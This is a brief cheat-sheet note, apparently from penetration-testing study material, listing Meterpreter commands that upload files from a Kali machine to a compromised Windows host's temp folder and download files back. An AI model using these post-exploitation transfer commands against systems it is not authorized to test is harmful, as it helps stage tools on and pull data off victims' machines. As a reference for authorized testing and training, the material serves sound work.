**Upload**

> In Meterpreter:

```
cd %TEMP%

upload /home/kali/<file>
```

**Download**

> In Meterpreter after we are in the current directory with desired file or specify path otherwise:

```
download C:\\Windows\\TEMP\\<file> /home/kali

OR

download <file> /home/kali
```

We can also use `cd` and `dir` commands in meterpreter.
